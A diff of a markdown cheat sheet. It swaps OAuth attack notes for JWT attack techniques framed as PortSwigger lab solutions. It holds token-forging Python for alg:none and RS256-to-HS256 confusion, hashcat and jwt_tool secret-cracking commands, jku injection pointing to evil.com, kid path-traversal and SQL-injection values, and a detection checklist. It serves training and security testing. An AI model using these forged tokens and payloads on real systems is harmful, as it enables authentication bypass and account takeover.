@@ -1,60 +1,110 @@
-# OAuth & Authentication Token Attacks
+# JWT Attack Techniques
 
-## OAuth Vulnerabilities
+## PortSwigger Lab Solutions
 
-### Missing State Parameter
-```
-# If OAuth flow doesn't validate state parameter:
-# 1. Attacker initiates OAuth flow
-# 2. Gets authorization code
-# 3. Victim clicks link with attacker's code
-# 4. Code gets linked to victim's account
-# 5. Attacker accesses victim's account
-```
+### Lab 1: JWT authentication bypass via unverified signature
+**Approach**: Server doesn't verify signature
+**Steps**:
+1. Decode JWT: base64(header).base64(payload).base64(signature)
+2. Change payload: {"sub":"wiener"} → {"sub":"administrator"}
+3. Re-encode (keep or remove signature)
+4. Send modified token
 
-### Token Leakage via Referrer
-```
-# If OAuth tokens in URL:
-# 1. Attacker posts image on forum: <img src="https://target.com/callback?token=xxx">
-# 2. When victim views post, token sent in Referer header
-# 3. Attacker captures token from server logs
-```
+### Lab 2: JWT authentication bypass via flawed signature verification  
+**Approach**: Algorithm confusion or none algorithm
+**Payload header**: `{"alg":"none","typ":"JWT"}`
+**Encoded**: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
 
-### Implicit Flow Token Theft
+### Lab 3: JWT authentication bypass via weak signing key
+**Approach**: Crack the secret key
 ```
-# Implicit flow returns token in URL fragment (#)
-# If JavaScript on page reads fragment and sends to server:
-# Attacker can inject JS to steal token
+hashcat -a 0 -m 16500 jwt.txt wordlist.txt
+# or
+john --wordlist=wordlist.txt jwt.txt
 ```
 
-## JWT Attack Reference
-
-### alg:none
+### Lab 4: JWT authentication bypass via jwk header injection
+**Approach**: Inject attacker's public key via jwk header
 ```
-# Change header: {"alg": "none", "typ": "JWT"}
-# Remove signature
-# Modify payload (role: admin)
-# Token: header.payload. (empty signature)
-```
-
-### Key Confusion (RS256 → HS256)
-```
-# If server uses RS256 (asymmetric) but accepts HS256 (symmetric):
-# 1. Get server's public key
-# 2. Sign token with public key as HMAC secret
-# 3. Server verifies with public key = valid
+{
+  "alg": "RS256",
+  "jwk": {
+    "kty": "RSA",
+    "e": "AQAB",
+    "n": "attacker_public_key_modulus"
+  }
+}
 ```
 
-### Kid Injection
+### Lab 5: JWT authentication bypass via jku header injection
+**Approach**: Point jku to attacker-controlled URL
 ```
-# If kid parameter is user-controllable:
-# {"kid": "/dev/null", "alg": "HS256"}
-# Sign with empty key (since /dev/null is empty)
+{
+  "alg": "RS256",
+  "jku": "https://evil.com/jwks.json"
+}
 ```
 
-### JKU/X5U Injection
+### Lab 6: JWT authentication bypass via kid header path traversal
+**Approach**: Path traversal in kid header to use known file
 ```
-# If jku/x5u parameter points to attacker's server:
-# Host malicious JWKS on attacker server
-# Point jku to attacker's URL
+{
+  "alg": "HS256",
+  "kid": "../../dev/null"
+}
+# Sign with empty string (dev/null content)
 ```
+
+## Common JWT Attacks
+
+### Algorithm None
+```python
+import base64
+import json
+
+header = {"alg": "none", "typ": "JWT"}
+payload = {"sub": "administrator", "role": "admin"}
+
+token = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
+token += '.' + base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
+token += '.'  # Empty signature
+print(token)
+```
+
+### Algorithm Confusion (RS256 → HS256)
+```python
+import jwt
+
+# Use public key as HMAC secret
+public_key = open('public.pem').read()
+token = jwt.encode({"sub": "administrator"}, public_key, algorithm='HS256')
+print(token)
+```
+
+### Crack Weak Secret
+```bash
+# Using hashcat
+hashcat -a 0 -m 16500 jwt.txt rockyou.txt
+
+# Using jwt_tool
+python3 jwt_tool.py <token> -C -d wordlist.txt
+```
+
+### kid Injection
+```
+# Set kid to SQL injection point
+{"kid": "1' OR '1'='1"}
+
+# Set kid to path traversal
+{"kid": "/dev/null"}
+# Sign with empty string
+```
+
+## Detection Checklist
+- [ ] JWT signature not verified
+- [ ] "none" algorithm accepted
+- [ ] Weak signing key (crackable)
+- [ ] jwk/jku header allows key injection
+- [ ] kid header vulnerable to injection/traversal
+- [ ] No expiration time (exp claim)
+- [ ] Sensitive data in payload
